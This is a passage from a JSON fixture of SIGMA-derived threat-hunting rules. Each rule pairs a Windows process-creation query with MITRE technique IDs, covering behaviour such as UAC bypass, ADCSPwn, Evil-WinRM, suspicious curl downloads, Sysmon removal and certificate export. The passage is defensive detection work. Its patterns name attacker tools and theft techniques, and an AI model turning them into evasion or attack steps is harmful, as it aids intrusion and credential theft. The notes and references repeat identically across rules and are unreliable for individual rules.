            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\")) and src.process.image.path contains \"\\ieinstal.exe\" and tgt.process.image.path contains \"\\AppData\\Local\\Temp\\\" and tgt.process.image.path contains \"consent.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 836
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially uncommon child processes of SndVol.exe (the Windows volume mixer)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Uncommon Child Processes Of SndVol.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\SndVol.exe\" and (not (tgt.process.image.path contains \"\\rundll32.exe\" and tgt.process.cmdline contains \" shell32.dll,Control_RunDLL \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 837
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can interact with the DACLs using built-in Windows commands takeown which can grant adversaries higher permissions on specific files and folders",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1222"
            ],
            "name": "Suspicious Recursive Takeown",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\takeown.exe\" and (tgt.process.cmdline contains \"/f \" and tgt.process.cmdline contains \"/r\"))) | columns tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 838
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects command line parameters used by ADCSPwn, a tool to escalate privileges in an active directory network by coercing authenticate from machine accounts and relaying to the certificate service",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1557"
            ],
            "name": "HackTool - ADCSPwn Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" --adcs \" and tgt.process.cmdline contains \" --port \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 839
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a suspicious curl process start on Windows and outputs the requested document to a local file",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Suspicious Curl.EXE Download",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\curl.exe\" or tgt.process.displayName=\"The curl executable\") and ((tgt.process.cmdline contains \"%AppData%\" or tgt.process.cmdline contains \"%Public%\" or tgt.process.cmdline contains \"%Temp%\" or tgt.process.cmdline contains \"%tmp%\" or tgt.process.cmdline contains \"\\AppData\\\" or tgt.process.cmdline contains \"\\Desktop\\\" or tgt.process.cmdline contains \"\\Temp\\\" or tgt.process.cmdline contains \"\\Users\\Public\\\" or tgt.process.cmdline contains \"C:\\PerfLogs\\\" or tgt.process.cmdline contains \"C:\\ProgramData\\\" or tgt.process.cmdline contains \"C:\\Windows\\Temp\\\") or (tgt.process.cmdline contains \".dll\" or tgt.process.cmdline contains \".gif\" or tgt.process.cmdline contains \".jpeg\" or tgt.process.cmdline contains \".jpg\" or tgt.process.cmdline contains \".png\" or tgt.process.cmdline contains \".temp\" or tgt.process.cmdline contains \".tmp\" or tgt.process.cmdline contains \".txt\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\")) and (not (src.process.image.path=\"C:\\Program Files\\Git\\usr\\bin\\sh.exe\" and tgt.process.image.path=\"C:\\Program Files\\Git\\mingw64\\bin\\curl.exe\" and (tgt.process.cmdline contains \"--silent --show-error --output \" and tgt.process.cmdline contains \"gfw-httpget-\" and tgt.process.cmdline contains \"AppData\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 840
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects various indicators of Microsoft Connection Manager Profile Installer execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "CMSTP Execution Process Creation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\cmstp.exe\") | columns tgt.process.cmdline,src.process.cmdline,Details",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 841
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Well-known TAP software installation. Possible preparation for data exfiltration using tunneling techniques",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048"
            ],
            "name": "Tap Installer Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\tapinstall.exe\" and (not ((tgt.process.image.path contains \":\\Program Files\\Avast Software\\SecureLine VPN\\\" or tgt.process.image.path contains \":\\Program Files (x86)\\Avast Software\\SecureLine VPN\\\") or tgt.process.image.path contains \":\\Program Files\\OpenVPN Connect\\drivers\\tap\\\" or tgt.process.image.path contains \":\\Program Files (x86)\\Proton Technologies\\ProtonVPNTap\\installer\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 842
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the \"type\" command to download/upload data from WebDAV server",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1105"
            ],
            "name": "Potential Download/Upload Activity Using Type Command",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"type \" and tgt.process.cmdline contains \" > \\\\\") or (tgt.process.cmdline contains \"type \\\\\" and tgt.process.cmdline contains \" > \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 843
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Search for usage of reg or Powershell by non-privileged users to modify service configuration in registry",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "Non-privileged Usage of Reg or Powershell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"reg \" and tgt.process.cmdline contains \"add\") or (tgt.process.cmdline contains \"powershell\" or tgt.process.cmdline contains \"set-itemproperty\" or tgt.process.cmdline contains \" sp \" or tgt.process.cmdline contains \"new-itemproperty\")) and ((tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\")) and (tgt.process.cmdline contains \"ControlSet\" and tgt.process.cmdline contains \"Services\") and (tgt.process.cmdline contains \"ImagePath\" or tgt.process.cmdline contains \"FailureCommand\" or tgt.process.cmdline contains \"ServiceDLL\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 844
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "DLL Sideloading by VMware Xfer Utility",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\VMwareXferlogs.exe\" and (not tgt.process.image.path contains \"C:\\Program Files\\VMware\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 845
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects Obfuscated Powershell via use MSHTA in Scripts",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1027",
                "t1059"
            ],
            "name": "Invoke-Obfuscation Via Use MSHTA",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"set\" and tgt.process.cmdline contains \"&&\" and tgt.process.cmdline contains \"mshta\" and tgt.process.cmdline contains \"vbscript:createobject\" and tgt.process.cmdline contains \".run\" and tgt.process.cmdline contains \"(window.close)\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 846
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the removal of Sysmon, which could be a potential attempt at defense evasion",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Uninstall Sysinternals Sysmon",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\Sysmon64.exe\" or tgt.process.image.path contains \"\\Sysmon.exe\") or tgt.process.displayName=\"System activity monitor\") and (tgt.process.cmdline contains \"-u\" or tgt.process.cmdline contains \"/u\" or tgt.process.cmdline contains \"\u2013u\" or tgt.process.cmdline contains \"\u2014u\" or tgt.process.cmdline contains \"\u2015u\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 847
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon or suspicious child processes of \"eventvwr.exe\" which might indicate a UAC bypass attempt",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Potentially Suspicious Event Viewer Child Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\eventvwr.exe\" and (not (tgt.process.image.path contains \":\\Windows\\System32\\mmc.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\WerFault.exe\" or tgt.process.image.path contains \":\\Windows\\SysWOW64\\WerFault.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 848
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects browsers starting with the remote debugging flags. Which is a technique often used to perform browser injection attacks",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1185"
            ],
            "name": "Browser Started with Remote Debugging",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \" --remote-debugging-\" or (tgt.process.image.path contains \"\\firefox.exe\" and tgt.process.cmdline contains \" -start-debugger-server\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 849
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Local accounts, System Owner/User discovery using operating systems utilities",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1033",
                "t1087"
            ],
            "name": "Local Accounts Discovery",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\cmd.exe\" and (tgt.process.cmdline contains \" /c\" and tgt.process.cmdline contains \"dir \" and tgt.process.cmdline contains \"\\Users\\\")) and (not tgt.process.cmdline contains \" rmdir \")) or (((tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\") and tgt.process.cmdline contains \"user\") and (not (tgt.process.cmdline contains \"/domain\" or tgt.process.cmdline contains \"/add\" or tgt.process.cmdline contains \"/delete\" or tgt.process.cmdline contains \"/active\" or tgt.process.cmdline contains \"/expires\" or tgt.process.cmdline contains \"/passwordreq\" or tgt.process.cmdline contains \"/scriptpath\" or tgt.process.cmdline contains \"/times\" or tgt.process.cmdline contains \"/workstations\"))) or ((tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\quser.exe\" or tgt.process.image.path contains \"\\qwinsta.exe\") or (tgt.process.image.path contains \"\\wmic.exe\" and (tgt.process.cmdline contains \"useraccount\" and tgt.process.cmdline contains \"get\")) or (tgt.process.image.path contains \"\\cmdkey.exe\" and tgt.process.cmdline contains \" /l\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 850
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1021"
            ],
            "name": "HackTool - WinRM Access Via Evil-WinRM",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ruby.exe\" and (tgt.process.cmdline contains \"-i \" and tgt.process.cmdline contains \"-u \" and tgt.process.cmdline contains \"-p \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 851
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the command line executed when TeamViewer starts a session started by a remote host.\nOnce a connection has been started, an investigator can verify the connection details by viewing the \"incoming_connections.txt\" log file in the TeamViewer folder.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1133"
            ],
            "name": "Remote Access Tool - Team Viewer Session Started On Windows Host",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path=\"TeamViewer_Desktop.exe\" and src.process.image.path=\"TeamViewer_Service.exe\" and tgt.process.cmdline contains \"TeamViewer_Desktop.exe --IPCport 5939 --Module 1\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 852
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects calls to cmdlets that are used to export certificates from the local certificate store. Threat actors were seen abusing this to steal private keys from compromised machines.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552",
                "t1059"
            ],
            "name": "Certificate Exported Via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
